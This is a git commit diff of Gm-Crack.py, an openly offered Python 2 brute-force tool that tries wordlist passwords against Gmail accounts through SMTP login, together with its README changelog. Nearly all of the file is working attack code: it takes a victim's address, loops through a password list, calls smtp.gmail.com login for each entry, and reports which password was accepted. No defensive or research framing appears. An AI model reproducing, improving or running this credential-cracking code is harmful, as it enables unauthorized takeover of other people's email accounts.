0ff82e7d08d7494ba4309b8548c59d3ea6a952ef
M-XacT-666 <43646493+mxact666@users.noreply.github.com>
2019-04-13 04:29:54 -0500

    Add files via upload

--- Gm-Crack.py
+++ Gm-Crack.py
@@ -1,102 +1,114 @@
 #!/usr/bin/python2
+#!/usr/env python2
 
-#############################
-import sys,optparse,platform
-sys.path.append('./lib/')
-import tools_core,smtplib
-#############################
-opsys = platform.system()
-#############################
-def cracking(target,wordlist,server,port):
-	print "[#]==============={ ATTACK INFORMATION }===============[#]"
-	print " [>] TARGET   : %s" % target
-	print " [>] WORDLIST : %s" % wordlist
-	print " [>] SERVER   : %s" % server
-	print " [>] PORT     : %s" % port
-	print "[#]==============={ END OF INFORMATION }===============[#]"
+# Copyright by M-XacT-666
+''' Script Kiddie, learn this script and modify with Your own style.
+	Do not Paste and Copy it.
+	Changing the Variabel and the Author Name didn't make You be a Programmer '''
+# Note: ASCII Art is copyrighted to ...
+#       Visit: https://www.asciiart.eu/weapons/axes
+
+import platform,os,argparse,smtplib
+if platform.system() == 'Windows':
+	os.system('cls')
+else:
+	os.system('clear')
+def jeda():
+	raw_input("Press [ENTER] ")
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--target",dest='target',help='Target Gmail Address',type=str)
+parser.add_argument("--wlist",dest='wlist',help='Specify Wordlist to use',type=str,default='./wordlist/mxact666_password.txt')
+parser.add_argument("--dserver",dest='dserver',help='SMTP Server to use',type=str,default='smtp.gmail.com')
+parser.add_argument("--dport",dest='dport',help='SMTP Port to use',type=int,default=465)
+options = parser.parse_args()
+
+if options.target == '' or options.target == 'None' or options.target == None:
 	print ""
-	print "[*] Configuring..."
+	print "[!] Error: Target unidentificated! Please check again"
+	print "           Your command! learn on 'EXAMPLE.txt'"
+	print "           or You can try run 'Gm-Crack.py --help' command"
+	print ""
+	jeda()
+	exit()
+
+print '''
+          XX
+        XX..X         Gm-Crack.py ---> Gmail Account
+      XX.....X                          Bruteforcer
+ XXXXX.....XX
+X |......XX%,.@       Coded by M-XacT-666 (copyright)
+X |.....X  @#%,.@
+X  \...X     @#%,.@
+ X# \.X        @#%,.@      Server   :  {0}
+  ##  X          @#%,.@      Port     :  {1}
+, "# #X            @#%,.@      Target   :  {2} 
+   `###X             @#%,.@      Wordlist :  {3}
+  . ' ###              @#%.,@
+    . ";"                @#%,.@
+      '                    @#%,.@
+      ` ,                    @#%,.@
+                              @####@
+
+'''.format(options.dserver,options.dport,options.target,options.wlist)
+
+try:
+	print "[*] Opening and Read Wordlist..."
+	isi_wlist = open(options.wlist,'r').readlines()
+	print "[+] Wordlist successfully opened and readed!"
+except:
+	print "[-] Error: Can't open or read Wordlist! check Location"
+	print "           or try again. Wordlist File's is may too big"
+	print "           or corrupted"
+	print ""
+	jeda()
+	exit()
+jumlah_kata = str(len(isi_wlist))
+print "[+] Total Word Phrase: %s" % jumlah_kata
+print ""
+try:
+	print "[*] Configuring SMTP for Authentication..."
+	serper = smtplib.SMTP_SSL(options.dserver,options.dport)
+	serper.ehlo()
+	print "[+] SMTP for Authentication successfully configured!"
+except:
+	print "[-] Error: Can't configure SMTP Auth...check Your connection"
+	print ""
+	jeda()
+	exit()
+hitung = 0
+print ""
+confirm = raw_input("Confirmation (Y/n) > ")
+if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
+	print ""
+	print "[-] Cracking Canceled with Confirmation..."
+	print ""
+	exit()
+else:
+	pass
+print ""
+for kata in isi_wlist:
+	hitung += 1
 	try:
-		gmcrack_core = smtplib.SMTP_SSL(server,port)
-		gmcrack_core.ehlo()
-		print "[+] Done :)"
-	except:
-		print "[-] Error ! Use another GMAIL_SMTP Server !!!"
-		exit()
-	print ""
-	print "[*] Preparing Wordlist..."
-	try:
-		wlist = open(wordlist,'r').readlines()
-		jumlah = str(len(wlist))
-		print "[+] {} Word-Phrase Loaded !".format(jumlah)
-		print "[+] Done :)"
-	except:
-		print tools_core.err_bukalst
-		exit()
-	print ""
-	print "[#]==============={ LAUNCHING ATTACK }===============[#]"
-	print ""
-	hitung = 0
-	for pwd in wlist:
-		hitung += 1
-		passkata = pwd.strip()
-		if hitung > jumlah:
+		passkata = kata.strip()
+		serper.login(options.target,passkata)
+		print ""
+		print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
+		break
+	except smtplib.SMTPAuthenticationError as ndass:
+		error = str(ndass)
+		if error[14] == '<':
 			print ""
-			print "[-] No Password found !!! Don't be sad Mr.Hacker...try to crack it with another Wordlist !"
+			print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
 			break
-		try:
-			gmcrack_core.login(target,passkata)
-			print ""
-			print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
-			break
-		except smtplib.SMTPAuthenticationError as ndass:
-			error = str(ndass)
-			if error[14] == '<':
-				print ""
-				print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
-				break
-			else:
-				print "[ INVALID ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
-				pass	
-		except KeyboardInterrupt:
-			print ""
-			print tools_core.err_keyint
-			exit()
-		except:
+		else:
+			print "[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
 			pass
-	tools_core.keluar()
-
-def main():
-	gmcrack_server = 'smtp.gmail.com'
-	gmcrack_port = 465
-	tools_core.clearscreen(opsys)
-	tools_core.judul()
-	parser = optparse.OptionParser('''
- [?] Usage: Use 'Gm-Crack.py --help' to show Help Contents
-
- [X] Example: Gm-Crack.py -t 'myvictim@gmail.com' -w '/root/wordlist/pass.txt'
-  |---> Target is 'myvictim@gmail.com' and Wordlist will used is 'pass.txt'
- [X] Example: Gm-Crack.py -t 'myvictim@gmail.com'
-  |---> Target is 'myvictim@gmail.com' and You will use My Default Wordlist...
-''')
-	parser.add_option("-t",dest="TARGET",help="Specify Target G-mail address !")
-	parser.add_option("--target",dest="TARGET",help="Specify Target G-mail address !")
-	parser.add_option("-w",dest="PASS_FILE",help="Wordlist File for cracking Password !")
-	parser.add_option("--wordlist",dest="PASS_FILE",help="Wordlist File for cracking Password !")
-	parser.add_option("--server",dest="GMAIL_SERVER",help="[OPTIONAL] Gmail-Server (Default:'smtp.gmail.com')")
-	parser.add_option("--sport",dest="SERVER_PORT",help="[OPTIONAL] Gmail-Server's Port (Default:465)")
-	(options, args) = parser.parse_args()
-	if (bool(options.TARGET) == False):
-		print parser.usage
+	except KeyboardInterrupt:
+		print ""
+		print "[-] Cracking Canceled with Keyboard Interrupt by User..."
+		print ""
+		jeda()
 		exit()
-	if (bool(options.PASS_FILE) == False):
-		gmcrack_wlist = './wordlist/mxact666_password.txt'
-	if (bool(options.GMAIL_SERVER) == True):
-		gmcrack_server = str(options.GMAIL_SERVER)
-	if (bool(options.SERVER_PORT) == True):
-		gmcrack_port = int(options.SERVER_PORT)
-	gmcrack_target = str(options.TARGET)
-	cracking(gmcrack_target,gmcrack_wlist,gmcrack_server,gmcrack_port)
-
-if __name__ == '__main__':
-	main()
+	except:
+		pass
--- README.txt
+++ README.txt
@@ -1,5 +1,5 @@
 ###############################################################
-### version 1.0:
+### HELLO :)
 +++ Description:
 Gm-Crack is a tool that is used to perform Dictionary Attacks
 (Bruteforce Attacks) against a Gmail server that aims to crack
@@ -8,7 +8,9 @@ a Gmail Account password.
 - Python2.7
 - Sublime Text 3 (UNREGISTERED (I dont have money))
 +++ Impact:
-- Crack Password
+- Crack Gmail Account Password
+###############################################################
+### version 1.0:
 +++ Feature:
 - Easy to use
 - I added My Wordlist into "wordlist" Folder if You want to
@@ -23,3 +25,19 @@ a Gmail Account password.
 - ParrotSec v4
 - Kali Linux (rolling) 2018.3
 ###############################################################
+### version 1.1:
++++ Feature:
+- Bug fixed
+- Change Banner
+###############################################################
+### version 1.2:
++++ Feature:
+- Bug Fixed (before version has a bug in the Wordlist section)
+- Change Banner (one banner only)
+- Moving from OptParse into ArgParse
+- Easy to Use
+- Now You can configure the Server and Port manually if You
+  want!
+- Wordlist extended (1500+ Word)
+###############################################################
+###
